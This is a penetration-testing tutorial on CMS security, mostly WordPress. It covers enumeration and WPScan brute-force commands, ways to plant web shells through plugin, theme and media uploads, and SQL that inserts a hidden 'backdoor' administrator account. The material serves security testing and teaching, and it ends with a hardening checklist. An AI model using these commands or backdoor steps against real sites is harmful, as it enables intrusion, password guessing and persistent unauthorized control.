# CMS Security Testing

## Content Management Systems (CMS)

A Content Management System (CMS) is a software application or platform that allows users to create, manage, and publish digital content on the web. CMSs simplify the process of building and maintaining websites by providing a user-friendly interface for content creation, editing, and organization.

CMSs play a crucial role in web application security testing as they are commonly targeted by attackers due to their widespread use. Understanding CMSs in the context of security testing is essential for identifying and mitigating vulnerabilities effectively.

Popular CMS platforms include:

- **WordPress** (powers over 40% of all websites on the internet).
- **Drupal** (commonly used by governments and large organizations).
- **Joomla** (used for portals and corporate websites).
- **Magento** (e-commerce focused).
- **Ghost** (blogging platform).

---

## Why Target CMSs?

CMSs are integral to web applications and websites, making them a prime target for security testing for several reasons:

- **Ubiquity**: CMSs like WordPress, Drupal, and Joomla power a significant portion of websites on the internet. Their widespread use makes them attractive targets for attackers.
- **Complexity**: CMSs are feature-rich, offering various plugins, themes, and customization options. This complexity can introduce security vulnerabilities.
- **Regular Updates**: CMSs frequently release updates and security patches to address vulnerabilities. Testing ensures that these updates are applied correctly.
- **User Data**: CMSs often handle sensitive user data, making security crucial to protect against data breaches.

---

## Common Security Concerns With CMSs

- **Vulnerabilities**: CMSs can have vulnerabilities like SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and more, which need to be identified and patched.
- **Authentication and Authorization**: Testing should verify that user authentication and authorization mechanisms are robust and that user roles and permissions are correctly enforced.
- **Configuration Issues**: Misconfigurations, default credentials, and overly permissive settings can lead to security vulnerabilities.
- **Plugin and Theme Security**: CMSs allow the installation of plugins and themes, which can introduce vulnerabilities if not developed and maintained securely.

---

# CMS Security Testing Methodology

A structured approach to CMS security testing follows these phases:

## 1. Information Gathering & Enumeration

- Identify the CMS and its version.
- Identify users, plugins, and themes.
- Perform directory and file enumeration.

## 2. Vulnerability Scanning

- Test for common misconfigurations and vulnerabilities.
- Perform vulnerability scanning and analysis to identify potential vulnerabilities or misconfigurations in plugins and themes.

## 3. Authentication Testing

- Perform username enumeration and brute-force attacks on login pages.
- Assess session handling for weaknesses and potential session fixation vulnerabilities.

## 4. Exploitation

- Identify and exploit known vulnerabilities in the CMS core.
- Identify and exploit vulnerabilities in plugins, extensions, and themes.

## 5. Post-Exploitation

- Identify ways to maintain access to the CMS after exploitation in the form of a backdoor or web shell.
- Attempt to extract data from the CMS or the underlying server.

---

# CMS Identification Tools

Before testing a CMS, you must identify which CMS the target is running and enumerate its components.

## Common CMS Identification Tools

| Tool | Description |
|---|---|
| `Wappalyzer` | Browser extension and CLI tool that identifies technologies including CMS |
| `WhatWeb` | CLI tool that fingerprints CMS, frameworks, and web technologies |
| `WPScan` | Specialized WordPress vulnerability scanner |
| `CMSeek` | CMS detection and exploitation toolkit |
| `droopescan` | Plugin-based CMS scanner for Drupal, WordPress, SilverStripe, etc. |
| `Joomscan` | Joomla vulnerability scanner |
| `cmsmap` | CMS scanner supporting WordPress, Joomla, and Drupal |

### Example: WhatWeb

```bash
whatweb https://target.local  # identifies the CMS and other web technologies.
```

### Example: CMSeek

```bash
cmseek -u https://target.local  # detects the CMS and performs basic enumeration.
```

---

# Introduction to WordPress

## What Is WordPress?

WordPress is one of the most popular and widely used Content Management Systems (CMS) for building websites and web applications. It is an open-source CMS, meaning its source code is available for examination and modification by the community.

WordPress is highly modular, allowing users to extend its functionality through plugins and themes. It provides an intuitive user interface for content management, making it accessible to non-technical users.

In the context of web application security testing, understanding WordPress is crucial, as it is a frequent target for attackers.

## WordPress Architecture

WordPress is built primarily on PHP and uses a MySQL or MariaDB database. Understanding its architecture is essential for effective security testing.

### Core Directory Structure

A typical WordPress installation has the following structure:

```text
/var/www/html/wordpress/
├── wp-admin/             # Admin dashboard files
│   ├── login.php         # Login page
│   ├── admin.php         # Admin panel entry point
│   └── ...
├── wp-includes/          # Core WordPress functions and libraries
│   ├── wp-db.php         # Database abstraction layer
│   ├── pluggable.php     # Authentication functions
│   └── ...
├── wp-content/           # User-uploaded and custom content
│   ├── plugins/          # Installed plugins (each in its own subdirectory)
│   ├── themes/           # Installed themes (each in its own subdirectory)
│   ├── uploads/          # User-uploaded files (images, documents, etc.)
│   └── ...
├── wp-config.php         # Main configuration file (database credentials, keys)
├── wp-login.php          # Login page
├── wp-signup.php         # Registration page (multisite)
├── xmlrpc.php            # XML-RPC interface (pingbacks, remote publishing)
├── wp-load.php           # Bootstrap file that loads WordPress
├── index.php              # Front controller
├── .htaccess              # Apache configuration (permalinks, redirects)
└── wp-json/               # REST API endpoint (/wp-json/wp/v2/)
```

### Key Files for Security Testing

| File / Path | Significance |
|---|---|
| `wp-config.php` | Contains database credentials, authentication keys, and salts. If readable, it reveals the database connection details |
| `wp-login.php` | Login page — target for brute-force and credential stuffing |
| `wp-admin/` | Admin dashboard — access requires authentication |
| `wp-content/uploads/` | User-uploaded files — potential location for web shells |
| `wp-content/plugins/` | Installed plugins — each plugin may introduce vulnerabilities |
| `wp-content/themes/` | Installed themes — themes may contain vulnerabilities |
| `xmlrpc.php` | XML-RPC interface — can be used for brute-force amplification and pingback DDoS |
| `wp-json/` | REST API — may expose user data and endpoints |
| `readme.html` | Default file that reveals the WordPress version |
| `wp-content/debug.log` | Debug log file — may contain sensitive information if debug mode is enabled |
| `wp-trackback.php` | Trackback functionality — can be abused for DDoS |

### WordPress Database Structure

WordPress uses a MySQL or MariaDB database with the following key tables:

| Table | Content |
|---|---|
| `wp_users` | User accounts (usernames, email addresses, hashed passwords) |
| `wp_usermeta` | User metadata (roles, capabilities) |
| `wp_posts` | Posts, pages, and custom post types |
| `wp_options` | Site configuration, plugin settings, active themes |
| `wp_terms` | Categories and tags |
| `wp_comments` | Comments and their metadata |

The `wp_users` table stores password hashes using `phpass` (MD5-based portable hash) by default. In newer versions, bcrypt or Argon2 may be used depending on PHP configuration.

## WordPress User Roles

WordPress implements a role-based access control system:

| Role | Capabilities |
|---|---|
| **Super Admin** | Full access to the entire network (multisite only) |
| **Administrator** | Full access to a single site, including plugins and themes |
| **Editor** | Can publish and manage posts, including those of other users |
| **Author** | Can publish and manage their own posts |
| **Contributor** | Can write and manage their own posts but cannot publish |
| **Subscriber** | Can only read posts and manage their profile |

From a security perspective, the **Administrator** role is the primary target — gaining admin access means full control over the WordPress site, including the ability to upload plugins (and thus web shells).

---

## WordPress Security Relevance

- **Highly Targeted**: Due to its prevalence, WordPress is a prime target for attackers seeking to exploit vulnerabilities.
- **Plugin Ecosystem**: The vast number of third-party plugins and themes increases the attack surface and introduces potential security risks.
- **Frequent Updates**: WordPress releases updates and security patches regularly to address known vulnerabilities.

---

## Common WordPress Vulnerabilities

### Vulnerable Plugins and Themes

Plugins and themes often contain vulnerabilities that can be exploited. Since the WordPress ecosystem relies heavily on third-party developers, the quality and security of plugins vary significantly. Many plugins are abandoned, outdated, or never received a security audit.

Common plugin/theme vulnerabilities include:

- SQL injection through unsanitized input parameters.
- XSS via reflected or stored input in plugin pages.
- Arbitrary file upload through improperly validated upload forms.
- Local File Inclusion (LFI) via unsanitized path parameters.
- Remote Code Execution (RCE) through unsafe `eval()`, `system()`, or `exec()` calls.
- SSRF through plugins that fetch remote URLs.

### Brute-Force Attacks

Attackers may attempt to guess login credentials through brute-force attacks against `wp-login.php` or `xmlrpc.php`.

WordPress does not implement account lockout by default, making it vulnerable to brute-force attacks unless additional security plugins are installed.

### SQL Injection

WordPress sites can be vulnerable to SQL injection attacks if input validation is inadequate. This can occur in:

- The WordPress core (rare in recent versions, but historical vulnerabilities exist).
- Plugins and themes that construct SQL queries without proper sanitization.
- Custom code added by site developers.

### Cross-Site Scripting (XSS)

XSS vulnerabilities can be introduced through:

- Plugins that output user input without proper escaping.
- Themes that do not sanitize post content or comments.
- Custom code that uses unsafe WordPress functions.

### Cross-Site Request Forgery (CSRF)

CSRF attacks may compromise the security of a WordPress site if authorization mechanisms are weak. WordPress core uses nonces (cryptographic tokens) to protect against CSRF, but plugins may not implement them correctly.

### Insecure Configuration

Misconfigurations, weak passwords, and overly permissive settings can lead to security issues:

- Default database table prefix (`wp_`) — makes automated SQL injection easier.
- Debug mode enabled in production (`WP_DEBUG` set to `true` in `wp-config.php`).
- File editing allowed in the admin dashboard (`DISALLOW_FILE_EDIT` not set).
- Weak admin passwords.
- Unrestricted user registration (`anyone can register` enabled with default role set to Subscriber or Contributor).
- Directory listing enabled on the web server.
- `wp-config.php` with world-readable permissions.
- Unrestricted `xmlrpc.php` access.
- Default `readme.html` and license files present.

---

# WordPress Pentesting Methodology

## 1. Information Gathering & Enumeration

### Port Scanning and Service Enumeration

```bash
nmap -sV -sC target.local  # scans for open ports and identifies services (web server, database, etc.).
```

```bash
nmap -p 80,443,3306,8080 --script=http-enum target.local  # enumerates common web paths and identifies WordPress.
```

### Identify WordPress Version

WordPress version can be identified through several methods:

**Check the meta generator tag:**

```bash
curl -s http://target.local | grep -i generator  # extracts the WordPress version from the HTML meta tag.
```

**Check readme.html:**

```bash
curl -s http://target.local/readme.html | grep -i version  # extracts the version from the default readme file.
```

**Check the feed:**

```bash
curl -s http://target.local/feed/ | grep -i generator  # extracts the version from the RSS feed.
```

### Enumerate Themes and Plugins

**Check the HTML source for theme and plugin paths:**

```bash
curl -s http://target.local | grep -oP 'wp-content/(themes|plugins)/[^/]+' | sort -u  # extracts theme and plugin directory names from the page source.
```

**Enumerate plugins with Gobuster:**

```bash
gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -u http://target.local/wp-content/plugins/ -s 200,301,403  # brute-forces plugin directories.
```

**Enumerate themes with Gobuster:**

```bash
gobuster dir -u http://target.local/wp-content/themes/ -w /usr/share/wordlists/dirb/common.txt -s 200,301,403  # brute-forces theme directories.
```

### File and Directory Enumeration

```bash
gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old -t 30 -o wp-enum.txt  # enumerates files and directories.
```

Key paths to check:

```text
/wp-admin/
/wp-login.php
/wp-config.php
/wp-content/uploads/
/wp-content/plugins/
/wp-content/themes/
/xmlrpc.php
/wp-json/
/readme.html
/wp-content/debug.log
/wp-content/backups/
/wp-content/upgrade/
```

---

## 2. Vulnerability Scanning with WPScan

**WPScan** is the primary tool for WordPress security testing. It is a free, open-source WordPress vulnerability scanner that can enumerate plugins, themes, users, and identify known vulnerabilities.

### Installation

WPScan is preinstalled on Kali Linux. To update it:

```bash
wpscan --update  # updates the WPScan database and tool.
```

### Basic Scan

```bash
wpscan --url http://target.local  # performs a basic WordPress scan.
```

### Aggressive Plugin Enumeration

```bash
wpscan --url http://target.local --enumerate ap  # aggressively enumerates all plugins.
```

### Enumerate Vulnerable Plugins

```bash
wpscan --url http://target.local --enumerate vp  # enumerates known vulnerable plugins.
```

### Enumerate Themes

```bash
wpscan --url http://target.local --enumerate t  # enumerates installed themes.
```

### Enumerate Vulnerable Themes

```bash
wpscan --url http://target.local --enumerate vt  # enumerates known vulnerable themes.
```

### Enumerate Users

```bash
wpscan --url http://target.local --enumerate u  # enumerates WordPress users.
```

### Full Enumeration

```bash
wpscan --url http://target.local --enumerate ap at u --random-user-agent -o wpscan-results.txt  # full enumeration with random user agents, saves results.
```

### WPScan Enumeration Codes

| Code | What It Enumerates |
|---|---|
| `u` | Users |
| `p` | Popular plugins |
| `ap` | All plugins (aggressive, slower) |
| `vp` | Vulnerable plugins |
| `t` | Popular themes |
| `at` | All themes (aggressive, slower) |
| `vt` | Vulnerable themes |
| `cb` | Config backups |
| `dbe` | Database exports |
| `tt` | Timthumbs |

### Scan With API Token

WPScan can check plugins and themes against its vulnerability database using an API token. A free API token is available by registering on the WPScan website.

```bash
wpscan --url http://target.local --api-token YOUR_API_TOKEN --enumerate vp,vt  # checks for known vulnerabilities using the API.
```

---

## 3. Authentication Testing

### Username Enumeration

WordPress user enumeration can be performed through:

**WPScan:**

```bash
wpscan --url http://target.local --enumerate u  # enumerates users via the REST API and author archives.
```

**REST API:**

```bash
curl -s http://target.local/wp-json/wp/v2/users | jq  # retrieves user information via the WordPress REST API.
```

**Author Archives:**

```bash
curl -s -I http://target.local/?author=1  # checks for user IDs via author archive redirects.
curl -s -I http://target.local/?author=2  # checks for the next user ID.
```

### Brute-Force Login with WPScan

```bash
wpscan --url http://target.local -U admin -P /usr/share/wordlists/rockyou.txt --max-threads 50  # brute-forces the admin password.
```

```bash
wpscan --url http://target.local -U users.txt -P /usr/share/wordlists/rockyou.txt -o wp-brute.txt  # brute-forces multiple users with a password list.
```

### xmlrpc.php Brute-Force

The `xmlrpc.php` endpoint can be used for brute-force attacks because it allows multiple password attempts within a single HTTP request (via the `system.multicall` method), which can bypass rate-limiting on `wp-login.php`.

```bash
wpscan --url http://target.local -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc-multicall  # brute-forces via xmlrpc.php multicall.
```

---

## 4. Exploitation

### Exploiting Known Vulnerabilities

Once a vulnerable plugin, theme, or WordPress version is identified, check for publicly available exploits:

```bash
searchsploit wordpress plugin <plugin-name>  # searches exploitdb for known exploits.
```

```bash
msfconsole -q -x "search wordpress; exit"  # searches Metasploit for WordPress modules.
```

### Common WordPress Exploitation Paths

| Attack Vector | Description |
|---|---|
| Vulnerable plugin RCE | Exploit a known RCE vulnerability in an outdated plugin |
| Arbitrary file upload | Abuse a plugin's upload functionality to upload a web shell |
| Plugin SQL injection | Extract data from the database via unsanitized plugin inputs |
| Theme XSS | Inject malicious JavaScript via theme vulnerabilities |
| xmlrpc.php amplification | Use multicall for brute-force amplification or pingback DDoS |
| REST API user enumeration | Extract usernames via `/wp-json/wp/v2/users` |
| wp-config.php disclosure | Read the config file to obtain database credentials |
| Arbitrary file read | Exploit LFI or path traversal in plugins to read sensitive files |

### Uploading a Web Shell via the Admin Panel

Once administrator access is obtained, a web shell can be uploaded through the plugin editor or by installing a malicious plugin:

**Method 1: Plugin Upload**

1. Access `wp-admin/plugin-install.php`.
2. Upload a malicious plugin ZIP containing a PHP web shell.
3. Activate the plugin.
4. Access the web shell at `wp-content/plugins/malicious-plugin/shell.php`.

**Method 2: Theme Editor**

If file editing is not disabled (`DISALLOW_FILE_EDIT` not set in `wp-config.php`):

1. Access `wp-admin/theme-editor.php`.
2. Edit a theme file (e.g. `404.php`) and inject PHP code.
3. Access the modified file (e.g. `http://target.local/wp-content/themes/twentytwentyfour/404.php`).

**Method 3: Media Upload**

1. Access `wp-admin/media-new.php`.
2. Upload a PHP file disguised as an image (may require bypassing upload restrictions).
3. Access the uploaded file in `wp-content/uploads/YYYY/MM/`.

---

## 5. Post-Exploitation

### Maintaining Access

After gaining access to a WordPress site, persistence can be maintained through:

- **Web shells**: Upload a PHP web shell in `wp-content/uploads/`, a theme directory, or a plugin directory.
- **Backdoor plugins**: Create a custom plugin that contains a hidden backdoor.
- **Modified theme files**: Inject backdoor code into an existing theme file (e.g. `functions.php`).
- **New admin user**: Create a new administrator account that is less likely to be noticed.
- **Modified `wp-config.php`**: Inject PHP code into the configuration file.

### Creating a New Admin User via the Database

If database access is obtained:

```sql
INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
VALUES ('backdoor', MD5('password123'), 'backdoor', 'backdoor@example.com', NOW(), 0, 'backdoor');

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_user_level', '10');
```

### Data Exfiltration

Sensitive data that can be extracted from a compromised WordPress site:

- User credentials from `wp_users` (password hashes).
- Email addresses and personal data.
- Plugin and theme configuration data.
- Database credentials from `wp-config.php`.
- Uploaded files and documents from `wp-content/uploads/`.
- API keys and secrets stored in plugin settings (in `wp_options`).

---

# Other CMS Testing Tools

While WordPress is the most common CMS tested, similar tools and methodologies exist for other CMSs:

## Drupal

```bash
droopescan scan drupal -u http://target.local  # scans a Drupal site for vulnerabilities and version.
```

```bash
cmsmap http://target.local  # scans CMS sites including Drupal.
```

Key Drupal paths to enumerate:

```text
/user/login
/admin
/modules/
/themes/
/sites/default/settings.php  # equivalent to wp-config.php
/CHANGELOG.txt               # reveals the Drupal version
```

## Joomla

```bash
joomscan -u http://target.local  # scans a Joomla site for vulnerabilities.
```

```bash
cmsmap http://target.local  # also supports Joomla scanning.
```

Key Joomla paths to enumerate:

```text
/administrator/
/components/
/modules/
/plugins/
/configuration.php  # equivalent to wp-config.php
/README.txt         # may reveal the Joomla version
```

---

# WordPress Hardening Checklist

Common security recommendations for WordPress:

- Keep WordPress core, plugins, and themes updated.
- Use strong, unique passwords for all admin accounts.
- Limit login attempts (via plugins or server-side rules).
- Disable file editing in the admin dashboard (`DISALLOW_FILE_EDIT` set to `true` in `wp-config.php`).
- Disable or restrict `xmlrpc.php` if not needed.
- Change the default database table prefix from `wp_`.
- Move `wp-config.php` one directory above the web root if possible.
- Disable directory listing on the web server.
- Remove default files (`readme.html`, `license.txt`).
- Restrict `wp-admin` access by IP if possible.
- Disable user registration if not needed.
- Set proper file permissions (files: `644`, directories: `755`, `wp-config.php`: `600`).
- Use HTTPS for all connections.
- Install a WAF or security plugin.
- Regularly back up the site and database.
- Remove unused plugins and themes.
- Enable debug logging to a file only, not to the screen (`WP_DEBUG_DISPLAY` set to `false`).

---

# Key Takeaways

- CMSs are prime targets for security testing due to their ubiquity and complexity.
- The CMS pentesting methodology follows: information gathering, vulnerability scanning, authentication testing, exploitation, and post-exploitation.
- WordPress is the most widely used CMS and the most frequently targeted.
- WordPress architecture includes core directories (`wp-admin`, `wp-includes`, `wp-content`) and key files (`wp-config.php`, `wp-login.php`, `xmlrpc.php`).
- WordPress user roles determine access levels (Administrator, Editor, Author, Contributor, Subscriber).
- Common WordPress vulnerabilities include vulnerable plugins/themes, brute-force attacks, SQL injection, XSS, CSRF, and insecure configurations.
- WPScan is the primary tool for WordPress enumeration and vulnerability scanning.
- User enumeration can be performed via the REST API, author archives, or WPScan.
- xmlrpc.php can be used for brute-force amplification via multicall.
- Administrator access allows uploading web shells via plugins, theme editors, or media uploads.
- Post-exploitation includes maintaining access via web shells, backdoor plugins, or creating new admin users.
- Other CMSs (Drupal, Joomla) have similar testing approaches with platform-specific tools and paths.
- Always validate findings manually before reporting them as vulnerabilities.
